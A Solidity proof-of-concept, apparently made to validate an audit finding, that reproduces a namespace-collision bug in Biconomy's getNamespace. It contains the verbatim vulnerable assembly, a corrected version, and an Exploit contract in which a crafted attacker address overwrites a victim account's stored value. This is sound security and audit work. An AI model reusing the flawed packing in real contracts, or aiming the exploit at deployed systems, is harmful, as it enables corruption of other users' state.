// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Biconomy finding 64110:
// "[H-01] Incorrect assembly packing in getNamespace causes collisions".
//
// getNamespace(account, _caller) is meant to isolate per-(account, caller)
// storage by hashing the 20-byte account concatenated with the 20-byte caller.
// The buggy assembly writes _caller at offset 0x14, which OVERWRITES the low
// 12 bytes of `account` with zero padding. The keccak over [0x0c, 0x28) then
// only sees the FIRST 8 bytes of `account`. Consequently any two DISTINCT
// accounts that share their first 8 address bytes map to the SAME namespace
// for the same caller.
//
// Harm reproduced below: a module (the caller) stores victim account A's value
// under namespace(A, caller). Attacker account B — chosen to share A's first 8
// bytes — writes under namespace(B, caller). Because the namespaces collide,
// B's write lands on A's slot: reading A's namespaced storage now returns the
// attacker's value. Cross-account storage aliasing / integrity corruption.
//
// The verbatim vulnerable function is inlined UNCHANGED (see `// @>`); only the
// surrounding minimal namespaced-storage double is a faithful representation of
// the opaque storage boundary that consumes getNamespace.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used only to record the harm magnitude at the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE namespaced storage. getNamespace is the verbatim audited function.
// ─────────────────────────────────────────────────────────────────────────────
contract NamespacedStorage {
    error SlotNotInitialized();

    mapping(bytes32 => bool) public isInitialized;
    mapping(bytes32 => uint256) internal _values;

    /// @notice VERBATIM audited function (Biconomy H-01).
    function getNamespace(address account, address _caller) public pure returns (bytes32 result) {
        assembly {
            mstore(0x00, account)
            mstore(0x14, _caller) // @> writes _caller at 0x14, zeroing account[8:20]; only account[0:8] enters the keccak -> collisions
            result := keccak256(0x0c, 0x28)
        }
    }

    function _slot(address account, address _caller, bytes32 key) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(getNamespace(account, _caller), key));
    }

    /// @notice The caller (a module) writes a value into `account`'s namespace.
    function writeStorage(address account, bytes32 key, uint256 value) external {
        bytes32 s = _slot(account, msg.sender, key);
        _values[s] = value;
        isInitialized[s] = true;
    }

    /// @notice Reads a value from namespace(account, _caller). Reverts if empty.
    function readStorage(address account, address _caller, bytes32 key) external view returns (uint256) {
        bytes32 s = _slot(account, _caller, key);
        if (!isInitialized[s]) revert SlotNotInitialized();
        return _values[s];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED namespaced storage: getNamespace uses Option 1 (shl-based packing) so
// the full 20-byte account is hashed and distinct accounts get distinct
// namespaces — no aliasing.
// ─────────────────────────────────────────────────────────────────────────────
contract NamespacedStorageFixed {
    error SlotNotInitialized();

    mapping(bytes32 => bool) public isInitialized;
    mapping(bytes32 => uint256) internal _values;

    /// @notice Corrected packing: _caller placed at 0x20 without overwriting account.
    function getNamespace(address account, address _caller) public pure returns (bytes32 result) {
        assembly {
            mstore(0x00, account)
            mstore(0x20, shl(96, _caller))
            result := keccak256(0x0c, 0x28)
        }
    }

    function _slot(address account, address _caller, bytes32 key) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(getNamespace(account, _caller), key));
    }

    function writeStorage(address account, bytes32 key, uint256 value) external {
        bytes32 s = _slot(account, msg.sender, key);
        _values[s] = value;
        isInitialized[s] = true;
    }

    function readStorage(address account, address _caller, bytes32 key) external view returns (uint256) {
        bytes32 s = _slot(account, _caller, key);
        if (!isInitialized[s]) revert SlotNotInitialized();
        return _values[s];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: victim account A and attacker account B share the first 8
// address bytes (0x1122334455667788). A's stored value is silently overwritten
// by B's write via the collided namespace. The corrupted victim magnitude is
// recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // Two DISTINCT accounts sharing their first 8 address bytes (1122334455667788).
    address internal constant VICTIM_A = 0x1122334455667788000000000000000000000001;
    address internal constant ATTACKER_B = 0x1122334455667788000000000000000000000002;

    bytes32 internal constant KEY = bytes32(uint256(1));
    uint256 internal constant VICTIM_SECRET = 1000 ether;
    uint256 internal constant ATTACKER_VALUE = 6660 ether;

    // Exposed results for the driver / Playground.
    address public storageAddr;
    address public markerAddr;
    bool public namespacesCollide;
    bytes32 public nsA;
    bytes32 public nsB;
    uint256 public victimValueBefore;
    uint256 public victimValueAfter;
    uint256 public corruptedMagnitude;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // --- deploy vulnerable storage + marker (marker LAST) ---
        NamespacedStorage store_ = new NamespacedStorage(); // nonce 1
        MiniToken marker = new MiniToken("Corrupted Victim State", "CORRUPTED-STATE"); // nonce 2 (LAST)
        storageAddr = address(store_);
        markerAddr = address(marker);

        // This Exploit contract acts as the module: it is `_caller` (msg.sender)
        // for every writeStorage call, and the explicit `_caller` for reads.
        address module = address(this);

        // 1) Legit: victim account A stores a secret under namespace(A, module).
        store_.writeStorage(VICTIM_A, KEY, VICTIM_SECRET);
        victimValueBefore = store_.readStorage(VICTIM_A, module, KEY);
        require(victimValueBefore == VICTIM_SECRET, "setup: A secret not stored");

        // 2) Attacker account B writes its own value under namespace(B, module).
        //    A and B share their first 8 bytes, so the buggy getNamespace collides
        //    and B's write lands on A's slot.
        store_.writeStorage(ATTACKER_B, KEY, ATTACKER_VALUE);

        // 3) Prove the collision and the aliasing.
        nsA = store_.getNamespace(VICTIM_A, module);
        nsB = store_.getNamespace(ATTACKER_B, module);
        namespacesCollide = (nsA == nsB);
        victimValueAfter = store_.readStorage(VICTIM_A, module, KEY);

        require(VICTIM_A != ATTACKER_B, "accounts must differ");
        require(namespacesCollide, "namespaces must collide under the bug");
        require(victimValueAfter == ATTACKER_VALUE, "victim A slot not overwritten by attacker B");
        require(victimValueAfter != VICTIM_SECRET, "victim value not corrupted");

        // --- record the corrupted victim magnitude to the SINK marker ---
        corruptedMagnitude = VICTIM_SECRET;
        marker.mint(SINK, corruptedMagnitude);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
